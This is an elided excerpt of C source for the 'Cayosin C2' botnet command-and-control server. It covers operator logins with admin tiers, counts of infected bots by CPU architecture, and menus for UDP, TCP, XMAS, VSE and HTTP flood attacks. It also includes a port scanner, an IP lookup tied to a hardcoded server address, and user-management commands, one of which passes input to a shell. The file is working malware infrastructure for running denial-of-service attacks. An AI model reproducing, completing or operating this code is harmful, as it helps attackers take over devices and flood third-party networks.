...
void broadcast(char *msg, int us, char *sender, int fuck, int amt2send, int thefd)
{
        ...
        for(i = 0; i < amt2send; i++)
        {
                ...
                {
                    char *message[1024];
                    snprintf(message, sizeof(message), "\r\n\x1B[1;34mAdmin(%s) Logged In\x1b[37m", sender);
                    if(sendMGM && managements[i].connected && !clients[i].connected) send(i, message, strlen(message), MSG_NOSIGNAL);
                    snprintf(fhdjkc, sizeof(fhdjkc), "\r\n"CYAN"%s"GRAY"@"CYAN"Cayosin\x1b[0m#\x1B[1;34m: \x1b[0m", managements[i].nickname);
                    if(sendMGM && managements[i].connected && !clients[i].connected) send(i, fhdjkc, strlen(fhdjkc), MSG_NOSIGNAL);
                    memset(message, 0, sizeof(message));
                ...
                else
                {
                    ...
                    {
                        send(i, "\n", 1, MSG_NOSIGNAL);
                        send(i, "\x1B[1;34m", strlen("\x1B[1;34m"), MSG_NOSIGNAL);
...
void *titleWriter(void *sock) 
{
        ...
        while(1)
        {
            ...
            sprintf(string, "%c]0; Zombies: %d | Users Online: %d %c", '\033', clientsConnected(), managesConnected, '\007');
...
void *telnetWorker(void *arguments)
{
        ...
        sprintf(login1,  "\x1b[0mWelcome To \x1B[1;34m%s \x1b[0m| \x1b[0mVersion \x1B[1;34m%s \x1b[0m| \x1b[0mBy \x1B[1;34m%s\x1b[0m\r\n", ss_name, ss_ver, ss_copyright);
        ...
        if(send(thefd, "\x1B[1;34mUsername\x1B[1;34m:", 23, MSG_NOSIGNAL) == -1) goto end;
        ...
        if(send(thefd, "\x1B[1;34mPassword\x1B[1;34m:", 23, MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        ...
        if(!strcmp(accounts[find_line].type, "admin"))
        {
            ...
            printf("\x1B[1;34mAdmin(\x1B[1;34m%s\x1B[1;34m:\x1B[1;34m%s\x1B[1;34m) Logged In\x1b[0m\n", accounts[find_line].id, management_ip);
        }
        else if(!strcmp(accounts[find_line].type, "superadmin"))
        {
            managements[thefd].adminstatus = 2;
            broadcast(buf, thefd, accounts[find_line].id, 3, MAXFDS, thefd);
            printf("\x1B[1;34mSuperAdmin(\x1B[1;34m%s\x1B[1;34m:\x1B[1;34m%s\x1B[1;34m) Logged In\x1b[0m\n", accounts[find_line].id, management_ip);
        }
        else
        {
            managements[thefd].adminstatus = 0;
            broadcast(buf, thefd, accounts[find_line].id, 1, MAXFDS, thefd);
            printf("\x1B[1;34m%s:%s Logged In\x1b[0m\n", accounts[find_line].id, management_ip);
        }
        ...
        snprintf(line1, sizeof(line1), "\x1B[1;34m[\x1b[0m+\x1B[1;34m] \x1B[1;34mAccess Granted\x1b[0m\r\n");
        snprintf(line2, sizeof(line2), "\x1B[1;34m[\x1b[0m+\x1B[1;34m] Welcome \x1b[0m%s\x1B[1;34m to %s\x1b[0m...\x1b[0m\r\n", accounts[find_line].id, ss_name);
        snprintf(line3, sizeof(line3), "");
        snprintf(line4, sizeof(line4), "\x1B[1;34m[\x1b[0m+\x1B[1;34m] Setting up %s terminal\x1b[0m...\r\n\r\n", ss_name);
        snprintf(line5, sizeof(line5), "");
        snprintf(line6, sizeof(line6), "\r\n"CYAN"%s"GRAY"@"CYAN"cayosin\x1b[0m#\x1B[1;34m: "C_RESET, accounts[find_line].id);

        sprintf(ascii_banner_line1,   "\x1B[1;34m               ╔═╗   ╔═╗   ╗ ╔   ╔═╗   ╔═╗   ═╔═   ╔╗╔              \x1b[0m \r\n");
        sprintf(ascii_banner_line2,   "\x1b[0m               ║     ║═║   ╚╔╝   ║ ║   ╚═╗    ║    ║║║              \x1b[0m \r\n");
        sprintf(ascii_banner_line3,   "\x1b[90m               ╚═╝   ╝ ╚   ═╝═   ╚═╝   ╚═╝   ═╝═   ╝╚╝              \x1b[0m \r\n");
        sprintf(ascii_banner_line4,   "\x1B[1;34m          ╔═══════════════════════════════════════════════╗         \x1b[0m \r\n");
        sprintf(ascii_banner_line5,   "\x1B[1;34m          ║\x1b[90m- - - - - \x1B[1;34m彼   ら  の  心   を  切  る\x1b[90m- - - - -\x1B[1;34m║\x1b[0m \r\n");
        sprintf(ascii_banner_line6,   "\x1B[1;34m          ║\x1b[90m- - - - - \x1b[0mType \x1B[1;34mHELP \x1b[0mfor \x1B[1;34mCommands List \x1b[90m- - - - -\x1B[1;34m║\x1b[0m \r\n");
        sprintf(ascii_banner_line7,   "\x1B[1;34m          ╚═══════════════════════════════════════════════╝         \x1b[0m \r\n\r\n");
        ...
        {           
            sprintf(botnet, "\x1B[1;34m╔═════════════════════════════════════╗\x1b[0m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1B[1;34m║ METHODS \x1b[90m- \x1b[0mShows Attack Commands     \x1B[1;34m║\x1b[0m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1B[1;34m║ TOOLS   \x1b[90m- \x1b[0mShows Available Tools     \x1B[1;34m║\x1b[0m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1B[1;34m║ SERVER  \x1b[90m- \x1b[0mShows ServerSide Commands \x1B[1;34m║\x1b[0m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1B[1;34m║ ADMIN   \x1b[90m- \x1b[0mShows Admin Commands      \x1B[1;34m║\x1b[0m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1B[1;34m╚═════════════════════════════════════╝\x1b[0m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        }
        ...
        {  
            ...
            {
                sprintf(botnet, "\x1B[1;34musers [\x1b[0m%d\x1B[1;34m]\r\n\x1b[0m", managesConnected);
            ...
            else
            {
                ...
                if(ppc != 0)
                {
                    sprintf(botnet, "\x1B[1;34mcayosin.powerpc [\x1b[0m%d\x1B[1;34m]\r\n\x1b[0m", ppc);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(sh4 != 0)
                {
                    sprintf(botnet, "\x1B[1;34mcayosin.sh4 [\x1b[0m%d\x1B[1;34m]\r\n\x1b[0m", sh4);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(x86 != 0)
                {
                    sprintf(botnet, "\x1B[1;34mcayosin.x86 [\x1b[0m%d\x1B[1;34m]\r\n\x1b[0m", x86);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(armv4 != 0)
                {
                    sprintf(botnet, "\x1B[1;34mcayosin.armv4 [\x1b[0m%d\x1B[1;34m]\r\n\x1b[0m", armv4);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(armv5 != 0)
                {
                    sprintf(botnet, "\x1B[1;34mcayosin.armv5 [\x1b[0m%d\x1B[1;34m]\r\n\x1b[0m", armv5);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(armv6 != 0)
                {
                    sprintf(botnet, "\x1B[1;34mcayosin.armv6 [\x1b[0m%d\x1B[1;34m]\r\n\x1b[0m", armv6);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(armv7 != 0)
                {
                    sprintf(botnet, "\x1B[1;34mcayosin.armv7 [\x1b[0m%d\x1B[1;34m]\r\n\x1b[0m", armv7);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(mips != 0)
                {
                    sprintf(botnet, "\x1B[1;34mcayosin.mips [\x1b[0m%d\x1B[1;34m]\r\n\x1b[0m", mips);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(m68k != 0)
                {
                    sprintf(botnet, "\x1B[1;34mcayosin.m68k [\x1b[0m%d\x1B[1;34m]\r\n\x1b[0m", m68k);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(debug != 0)
                {
                    sprintf(botnet, "\x1B[1;34mcayosin.debug [\x1b[0m%d\x1B[1;34m]\r\n\x1b[0m", debug);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(sparc != 0)
                {
                    sprintf(botnet, "\x1B[1;34mcayosin.sparc [\x1b[0m%d\x1B[1;34m]\r\n\x1b[0m", sparc);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(mipsel != 0)
                {
                    sprintf(botnet, "\x1B[1;34mcayosin.mipsel [\x1b[0m%d\x1B[1;34m]\r\n\x1b[0m", mipsel);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(boxes != 0)
                {
                    sprintf(botnet, "\x1B[1;34mcayosin.servers [\x1b[90m%d\x1B[1;34m]\r\n\x1b[0m", boxes);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(pmalinux != 0)
                {
                    sprintf(botnet, "\x1B[1;34mcayosin.pma.linux [\x1b[0m%d\x1B[1;34m]\r\n\x1b[0m", pmalinux);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(pmawindows != 0)
                {
                    sprintf(botnet, "\x1B[1;34mcayosin.pma.windows [\x1b[0m%d\x1B[1;34m]\r\n\x1b[0m", pmawindows);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                if(unknown != 0)
                {
                    sprintf(botnet, "\x1B[1;34mcayosin.unknown [\x1b[0m%d\x1B[1;34m]\r\n\x1b[0m", unknown);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                sprintf(botnet, "\x1B[1;34mTotal: [\x1b[0m%d\x1B[1;34m]\r\n\x1b[0m", clientsConnected());
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                if(accounts[find_line].maxbots < clientsConnected())
                {
                    sprintf(botnet, "\x1B[1;34mAvailable Bots [\x1b[0m%d\x1B[1;34m]\r\n\x1b[0m", accounts[find_line].maxbots);
                }
        ...
        else if(strstr(buf, "iplookup ") || strstr(buf, "IPLOOKUP "))
        {
            ...
            if(atoi(myhost) >= 8)
            {
                ...
                char *iplookup_host = "179.43.154.140"; // Change to Server IP
                ...
                else
                {
                    ...
                    if(send(IPLSock, iplheaders, strlen(iplheaders), 0))
                    {
                        ...
                        sprintf(botnet, "\x1b[0m[\x1B[1;34mIPLookup\x1b[0m] \x1B[1;34mGetting Info For -> %s...\r\n", myhost);
                        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                        char ch;
                        int retrv = 0;
                        ...
                        else sprintf(botnet, "\x1B[1;34m[+]--- \x1b[0mResults\x1B[1;34m ---[+]\r\n\x1b[0m%s\x1b[37m\r\n", iplbuffer);
                        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    }
                    else
                    {
        ...
        else if(strstr(buf, ". unmute") || strstr(buf, ". UNMUTE"))
        {
            if(managements[thefd].adminstatus == 1 || managements[thefd].adminstatus == 2)
            {
                ...
                sprintf(botnet, "\x1B[1;34m%s \x1b[32mYou've Forced Unmute on All Clients.\x1b[37m\r\n", managements[thefd].nickname);
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            }
            else
            {
        ...
        else if(strstr(buf, "killed") || strstr(buf, "KILLED"))
        {
            if(managements[thefd].adminstatus == 1 || managements[thefd].adminstatus == 2)
            {
                sprintf(botnet, "\x1B[1;34mBot Process's Killed: [\x1b[0m%d\x1B[1;34m]\x1b[37m\r\n", bot_procs_killed);
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            }
            else
            {
        ...
        else if(strstr(buf, "resolve") || strstr(buf, "RESOLVE"))
        {
            ...
            trim(url);
            resolvehttp(url, ip);
            printf("\x1B[1;34m[\x1b[0mResolver\x1B[1;34m] %s -> %s\n", url, ip);
            sprintf(botnet, "\x1B[1;34m[\x1b[0mResolver\x1B[1;34m] %s -> %s\r\n", url, ip);
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        else if(strstr(buf, "PORTSCAN ") || strstr(buf, "portscan "))
        {
            ...
            int max_port = 10000; // this is the max port we want to check
            char host[16];
            trim(buf);
            char *token = strtok(buf, " ");
            snprintf(host, sizeof(host), "%s", token+strlen(token)+1);
            snprintf(botnet, sizeof(botnet), "\x1B[1;34m[\x1b[0mPortscanner\x1B[1;34m] \x1b[0mChecking ports \x1B[1;34m%d-%d \x1b[0mon -> \x1B[1;34m%s...\x1b[0m\r\n", least_port, max_port, host);
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            for(x=least_port; x < max_port; x++)
            {
                ...
                {
                    snprintf(botnet, sizeof(botnet), "\x1B[1;34m[\x1b[0mPortscanner\x1B[1;34m] %d \x1b[0mis open on \x1B[1;34m%s!\x1b[0m\r\n", x, host);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    memset(botnet, 0, sizeof(botnet));
                    close(Sock);
                }
            }
            snprintf(botnet, sizeof(botnet), "\x1B[1;34m[\x1b[0mPortscanner\x1B[1;34m] \x1b[32mScan on \x1B[1;34m%s \x1b[32mfinished.\x1b[0m\r\n", host);
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
        }
        else if(strstr(buf, "adduser") || strstr(buf, "ADDUSER"))
        {
            if(managements[thefd].adminstatus == 1 || managements[thefd].adminstatus == 2)
            {
                ...
                system(uinfo);
                printf("\x1B[1;34m%s\x1b[0m added user[\x1B[1;34m%s\x1b[0m]\n", accounts[find_line].id, userinfo);
                sprintf(botnet, "\x1B[1;34m%s\x1b[0m added user[\x1B[1;34m%s\x1b[0m]\r\n", accounts[find_line].id, userinfo);
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            }
            else
            {
            ...
            if(managements[thefd].adminstatus == 1 || managements[thefd].adminstatus == 2)
            {
                ...
                if(strstr(buf, "user=") || strstr(buf, "USER="))
                {
                    ...
                    for(id=0; id < MAXFDS; id++)
                    {
                        ...
                        {
                            sprintf(botnet, "\n\x1b[31mGoodbye, kicked by \x1B[1;34m%s\x1b[0m...\r\n", managements[thefd].nickname);
                            if(send(id, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                            managements[id].connected = 0;
                            close(id);
                            //managesConnected -= 1;
                            sprintf(botnet, "\x1B[1;34mKicked \x1B[1;34m%s\x1b[0m...\r\n", user);
                            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                        }
                    }
                }
                else if(strstr(buf, "id=") || strstr(buf, "ID="))
                {
                    ...
                    close(uid);
                    //managesConnected -= 1;
                    sprintf(botnet, "\x1B[1;34mKicked user with ID # \x1B[1;34m%d\x1b[0m...\r\n", uid);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
            }
            else
            ...
            if(managements[thefd].adminstatus == 2) // 2 = superadmin
            {
                ...
                if(strstr(buf, "user=") || strstr(buf, "USER="))
                {
                    ...
                    else
                    {
                        ...
                        sprintf(botnet, "\n\x1b[31mGoodbye, banned by \x1B[1;34m%s\x1b[0m...\r\n", managements[thefd].nickname);
                        if(send(id, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                        managements[id].connected = 0;
                        close(id);
                        sprintf(botnet, "\x1B[1;34mBanned \x1B[1;34m%s\x1b[0m...\r\n", iusername);
                        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                    }
                }
                else if(strstr(buf, "id=") || strstr(buf, "ID="))
                {
                    ...
                    close(uid);
                    sprintf(botnet, "\x1B[1;34mBanned user with ID # %d\x1b[0m...\r\n", uid);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
                else if(strstr(buf, "ip=") || strstr(buf, "IP="))
                {
                    ...
                    for(kx=0; kx < MAXFDS; kx++)
                    {
                        if(!strcmp(managements[kx].ip, target))
                        {
                            ...
                            managements[kx].connected = 0;
                            close(kx);
                            sprintf(botnet, "\x1B[1;34mBanned user with IP %d\x1b[0m...\r\n", target);
                            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                        }
                    }
                }
        ...
        {
            int k;
            strcpy(botnet, "\x1B[1;34m- \x1b[90mOnline Users \x1B[1;34m-\x1b[0m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            for(k=0; k < MAXFDS; k++)
            {
                if(strlen(managements[k].nickname) > 1 && managements[k].connected == 1)
                {
                    sprintf(botnet, "\x1B[1;34mID(%d) \x1B[1;34m%s\x1b[0m\r\n", k, managements[k].nickname);
                    if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                }
            }
        }
        ...
        {           
            sprintf(botnet, "\x1B[1;34m╔═══════════════════════════════════════════════════════════╗\x1b[0m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1B[1;34m║ UDP Flood \x1b[90m- \x1b[0m. UDP [IP] [PORT] [TIME] 32 0 10              \x1B[1;34m║\x1b[0m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1B[1;34m║ TCP Flood \x1b[90m- \x1b[0m. TCP [IP] [PORT] [TIME] 32 [FLAGS(all)] 0 10 \x1B[1;34m║\x1b[0m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1B[1;34m║ CNC Flood \x1b[90m- \x1b[0m. CNC [IP] [PORT] [TIME]                      \x1B[1;34m║\x1b[0m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1B[1;34m║ RHex STD  \x1b[90m- \x1b[0m. STD [IP] [PORT] [TIME]                      \x1B[1;34m║\x1b[0m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); 
            sprintf(botnet, "\x1B[1;34m║ RHex HTTP \x1b[90m- \x1b[0m. HTTP [URL] [PORT] [TIME] [THREADS] [METHOD] \x1B[1;34m║\x1b[0m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);     
            sprintf(botnet, "\x1B[1;34m║ XMAS \x1b[90m- \x1b[0m. CRASH [IP] [PORT] [TIME] 32 1024 10              \x1B[1;34m║\x1b[0m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);         
            sprintf(botnet, "\x1B[1;34m║ VSE  \x1b[90m- \x1b[0m. SMITE [IP] [PORT] [TIME] 32 1024 10              \x1B[1;34m║\x1b[0m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); 
            sprintf(botnet, "\x1B[1;34m║   *Arch Specific* \x1b[0m- \x1B[1;34mBegin Command Line With \x1b[0mbin=[arch]    \x1B[1;34m║\x1b[0m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); 
            sprintf(botnet, "\x1B[1;34m╚═══════════════════════════════════════════════════════════╝\x1b[0m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1); 
        }
        ...
        {           
            sprintf(botnet, "\x1B[1;34m╔══════════════════════════════════╗\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1B[1;34m║ IP Lookup \x1b[90m- \x1b[0mIPLOOKUP [TARGET]    \x1B[1;34m║\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1B[1;34m║ Resolver \x1b[90m- \x1b[0mRESOLVE [TARGET]      \x1B[1;34m║\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1B[1;34m║ Port Scanner \x1b[90m- \x1b[0mPORTSCAN [TARGET] \x1B[1;34m║\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1B[1;34m╚══════════════════════════════════╝\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        }
        ...
        {           
            sprintf(botnet, "\x1B[1;34m╔═══════════════════════════════════╗\x1b[0m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1B[1;34m║ BOTS \x1b[90m- \x1b[0mShows Bot Count/Arch       \x1B[1;34m║\x1b[0m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1B[1;34m║ KILLED \x1b[90m- \x1b[0mShows Killed Processes   \x1B[1;34m║\x1b[0m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1B[1;34m║ Online? \x1b[90m- \x1b[0mShows Online Users      \x1B[1;34m║\x1b[0m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1B[1;34m║ CLS \x1b[90m- \x1b[0mClears Screen               \x1B[1;34m║\x1b[0m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1B[1;34m║ Chat Mute \x1b[90m- \x1b[0m. MUTE ON |. MUTE OFF \x1B[1;34m║\x1b[0m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            sprintf(botnet, "\x1B[1;34m╚═══════════════════════════════════╝\x1b[0m\r\n");
            if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
        }
        ...
        {  
            ...
            {           
                sprintf(botnet, "\x1B[1;34m╔════════════════════════════════════════════════════════════════╗\x1b[0m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                sprintf(botnet, "\x1B[1;34m║ Force Unmute All \x1b[90m- \x1b[0m. UNMUTE                                    \x1B[1;34m║\x1b[0m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                sprintf(botnet, "\x1B[1;34m║ Kick \x1b[90m- \x1b[0m. KICK USER=[USERNAME] | . KICK ID=[ID#]                \x1B[1;34m║\x1b[0m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                sprintf(botnet, "\x1B[1;34m║ Add User \x1b[90m- \x1b[0mADDUSER [USER] [PASS] [TYPE(admin/common)] [PLAN]   \x1B[1;34m║\x1b[0m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                sprintf(botnet, "\x1B[1;34m║ SUPER \x1b[90m- \x1B[1;34mShows Super Admin Commands                             \x1B[1;34m║\x1b[0m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
                sprintf(botnet, "\x1B[1;34m╚════════════════════════════════════════════════════════════════╝\x1b[0m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) return;
            }
        ...
        {           
            if(managements[thefd].adminstatus ==2)
            {
                sprintf(botnet, "\x1B[1;34m╔══════════════════════════════════════════════════╗\x1b[0m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
                sprintf(botnet, "\x1B[1;34m║ Connection Ban \x1b[90m- \x1b[0m. BAN IP=[IP]                   \x1B[1;34m║\x1b[0m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
                sprintf(botnet, "\x1B[1;34m║ User Ban \x1b[90m- \x1b[0m. BAN USER=[USER] | . BAN ID=[ID#]    \x1B[1;34m║\x1b[0m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
                sprintf(botnet, "\x1B[1;34m║ \x1b[0m(User/ID Ban Resolves and Bans Their IP Address) \x1B[1;34m║\x1b[0m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
                sprintf(botnet, "\x1B[1;34m║ Unban \x1b[90m- \x1b[0m. UNBAN IP=[IP]                          \x1B[1;34m║\x1b[0m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
                sprintf(botnet, "\x1B[1;34m╚══════════════════════════════════════════════════╝\x1b[0m\r\n");
                if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1);
            }
        ...
        else if(strstr(buf, "CLS") || strstr(buf, "cls") || strstr(buf, "CLEAR") || strstr(buf, "clear"))
        {
            ...
            managements[thefd].connected = 1;
                ...
                trim(buf);
                char *okstring[200];
                snprintf(okstring, sizeof(okstring), ""CYAN"%s"GRAY"@"CYAN"cayosin\x1b[0m#\x1B[1;34m: \x1b[0m", accounts[find_line].id);
        ...
        if(managements[thefd].adminstatus == 1 || managements[thefd].adminstatus == 2)
        {
            ...
            printf("\x1B[1;34mAdmin(\x1b[0m%s\x1B[1;34m:%s\x1B[1;34m) \x1b[31mLogged Out\x1b[0m.\n", accounts[find_line].id, management_ip);
        }
        else
        {
            broadcast(buf, thefd, usernamez, 2, MAXFDS, thefd);
            printf("\x1B[1;34m%s\x1b[0m:\x1B[1;34m%s \x1b[31mLogged Out\x1b[0m.\n", accounts[find_line].id, management_ip);
        }
...
int main (int argc, char *argv[], void *sock)
{
        ...
        printf("      [\x1B[1;34mCayosin C2\x1b[0m]\n   -----------------------\n");
